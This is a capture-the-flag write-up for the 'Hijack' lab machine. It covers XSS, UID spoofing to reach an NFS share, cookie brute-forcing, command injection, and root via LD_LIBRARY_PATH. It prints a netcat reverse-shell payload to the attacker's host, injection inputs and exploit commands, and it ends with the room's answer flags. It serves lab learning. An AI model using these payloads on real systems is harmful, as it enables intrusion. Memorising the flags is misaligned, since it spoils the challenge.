# Hijack
(Flags are at the end of the writeup)

### Deploy the machine and get the flags!
Initial scan finds ports 21,22,80,111,2049,35287,41763,47944,49228 open.<br />
After further enumeration, I found that the `username` parameter is vulnerable to XSS. To prove it, I tried using `"><script>alert(1)</script>`, and it worked:<br />
![image](https://github.com/user-attachments/assets/556f544c-3bd3-4857-a0cf-f4aa1832e42e)<br />
I then checked the nfs service, the command to mount the shared file system is `sudo mount -t nfs 10.10.246.225:/mnt/share mount -o nolock`<br />
However only user with ID=1003 can access the shared filesystem.<br />
![image](https://github.com/user-attachments/assets/d84ec36c-483b-4c3f-a340-3b988fa4d12b)<br />
So we need to create another user with ID=1003 with `sudo useradd -u 1003 hijack`. Give a password to that user with `sudo passwd hijack`
After logging with the new user, I found some FTP credentials:<br />
![image](https://github.com/user-attachments/assets/762f5a5e-ebee-4a1c-97f9-a2bf1db0456f)<br />
Remember to remove the user with `sudo userdel hijack`. So I logged in the FTP server and found some other files:<br />
![image](https://github.com/user-attachments/assets/a3237956-df3d-4696-956c-0639f520f66d)<br />
The `passwords_list.txt` file contains, guess what, a list of complex passwords. I think I need to use this list to bruteforce something. So I tried bruteforcing the login page to access the administration panel. 
If you examine the cookie, you can see it's a base64 encoded string with the following format: `user:MD5_hashed_password`. So since we know that a user called `admin` exists, and we have the password list, then we have every ingredient to bruteforce logins.
To do that, I created (thanks, Mr. GPT), a python script called `brutecookie.py` that you can find inside this folder. Remember to change the parameters according to your instance before executing the script.<br />
![image](https://github.com/user-attachments/assets/c9ab8a6d-a882-4a69-9eb2-5298f9d37f4d)<br />
Great, we can now login using this password!<br />
![image](https://github.com/user-attachments/assets/67e4bff7-e207-4bfa-889c-f51bdc05c73f)<br />
It seems like a page to check which services exists on the host. So my guess is that it executes something like `systemctl status example.service`. So I immediatly tought of command injection. `;` gets detected, then I tried `example && whoami` and it worked!<br />
![image](https://github.com/user-attachments/assets/71ccdabd-303e-4378-baf7-483db20e0282)<br />
Time to get a reverse shell. Open a nc listener and run use the following payload `& busybox nc 10.11.108.100 4444 -e sh`.<br />
I immediately found credentials inside `confing.php`:<br />
![image](https://github.com/user-attachments/assets/de2653f1-c3f3-4de4-9502-3117292f4123)<br />
They look like mysql credentials, and I think they are, but I used them to access rick's account through ssh and get the first flag. <br />
Running `sudo -l` we get the following:<br />
![image](https://github.com/user-attachments/assets/a55d25fe-2c56-4435-8deb-e636213e3087)<br />
We can execute a binary called `apache2` and have also access to the LD_LIBRARY_PATH. LD_LIBRARY_PATH allows us to specify where the program should go look for shared libraries/objects first. So the idea is to take the name of any of the libraries used by the `apache2` binary, and create a malicious script with that exact name inside a folder that we have access to. <br /> Run `ldd /usr/sbin/apache2` to see the shared object used by the binary.
I'm gonna take `libdl.so.2`. So, first of all, create the malicious .c file; you can find it inside this folder, called `exploit.c`. Then, compile it using the following command: `gcc -o /tmp/libdl.so.2 -shared -fPIC exploit.c`. Then, run the binary after setting the evnvironment variable, with the following command: `sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2`:<br />
![image](https://github.com/user-attachments/assets/b32556c3-a386-4c53-92b7-c6a704b5e511)<br />



- What is the user flag? `THM{fdc8cd4cff2c19e0d1022e78481ddf36}`
- What is the root flag? `THM{b91ea3e8285157eaf173d88d0a73ed5a}`
